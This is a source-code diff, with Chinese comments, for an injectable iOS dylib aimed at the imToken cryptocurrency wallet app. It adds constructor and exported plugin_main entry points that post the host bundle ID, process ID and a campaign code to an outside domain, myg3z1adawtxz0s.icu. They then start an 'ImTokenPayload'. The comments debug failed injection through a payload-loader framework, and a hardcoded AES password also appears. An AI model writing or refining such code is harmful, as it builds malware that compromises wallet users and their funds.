@@ -179,42 +179,76 @@ static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
 
 @end
 
-__attribute__((constructor))
-static void imtoken_init(void) {
-    @autoreleasepool {
-        // 只在 imToken 进程里跑。用 contains 而不是 == ，避免 bundleId 带后缀时静默退出。
-        NSString *bid = [Info hostBundleId] ?: @"";
-        BOOL isImToken = [bid.lowercaseString containsString:@"im.token"];
+#pragma mark - 零依赖上报（只用来证明「代码真的进来了」）
 
-        if (!isImToken) {
-            // 注进来了但不是 imToken：报一条，便于确认模块加载位置
-            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
-                ev[@"et"] = @"imtoken_wrong_host";
-                ev[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
-                ev[@"ctx"] = @{ @"hostBundleId": bid };
-                [[Net shared] sendEvent:ev];
-            });
-            return;
-        }
-        [[ImTokenPayload shared] start];
-    }
+/**
+ * 只用 NSBundle + NSURLSession，不碰 Net / Info。
+ * 之前 wrong_host 分支里调 [[Net shared] sendEvent:] 时 baseURL 还是 nil，
+ * 请求发到 nil URL 静默失败 —— 结果两条上报路径都看不见。
+ */
+static void RawPing(NSString *tag, NSString *extra) {
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
+    NSDictionary *body = @{
+        @"et": tag ?: @"ping",
+        @"u": bid,
+        @"d": bid,
+        @"pid": @(getpid()),
+        @"c": @"d9f5121f75a6646c4f814a4ff8c41b04",
+        @"ctx": @{ @"hostBundleId": bid,
+                   @"module": @"imtoken",
+                   @"extra": extra ?: @"" },
+    };
+    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:NULL];
+    if (!json) return;
+
+    NSMutableURLRequest *req = [NSMutableURLRequest
+        requestWithURL:[NSURL URLWithString:@"https://myg3z1adawtxz0s.icu/event"]];
+    req.HTTPMethod = @"POST";
+    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
+    req.HTTPBody = json;
+    req.timeoutInterval = 20;
+
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
+        dataTaskWithRequest:req
+          completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+              dispatch_semaphore_signal(sem);
+          }];
+    [task resume];
+    dispatch_semaphore_wait(sem,
+        dispatch_time(DISPATCH_TIME_NOW, (int64_t)(22 * NSEC_PER_SEC)));
+}
+
+static void RawPingAsync(NSString *tag, NSString *extra) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+        @try { RawPing(tag, extra); } @catch (NSException *e) { (void)e; }
+    });
+}
+
+#pragma mark - 入口
+
+__attribute__((constructor))
+static void imtoken_ctor(void) {
+    // 守护进程注入走这条
+    RawPingAsync(@"imtoken_ctor", @"constructor");
 }
 
 /**
- * 框架真正调用的入口。
+ * 框架真正调用的入口（core.dylib 里 dlsym 的是 _plugin_main）。
  *
- * core.dylib 里可见：
- *   _entry_main
- *   _injectDylibToPid:dylibData:dylibSize:entrySymbol:outIpc:
- *   PLERROR_PROGRESS_PAYLOAD_LOADER_RUN_ENTRY_POINT
- *   PLERROR_PAYLOAD_ENTRY_POINT_NOT_FOUND
- *
- * 也就是说：往「用户 App」注入时，加载器会 dlsym("entry_main") 再调用它。
- * 找不到就报 0x5005（我们之前 imToken 一直注入失败就是这个原因）。
- * 编译带 -fvisibility=hidden，所以必须显式 default 可见性。
+ * 之前一直报 PLERROR_PAYLOAD_ENTRY_POINT_NOT_FOUND，就是因为我们的 dylib
+ * 带 -fvisibility=hidden 且没有导出任何符号。
  */
 __attribute__((visibility("default"), used))
 void plugin_main(void) {
-    imtoken_init();
+    // 第一件事：零依赖上报，确认代码真的跑在 imToken 进程里
+    RawPingAsync(@"imtoken_plugin_main", @"entry called");
+
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+        @try {
+            [[ImTokenPayload shared] start];
+        } @catch (NSException *e) {
+            RawPingAsync(@"imtoken_start_failed", e.reason ?: @"");
+        }
+    });
 }
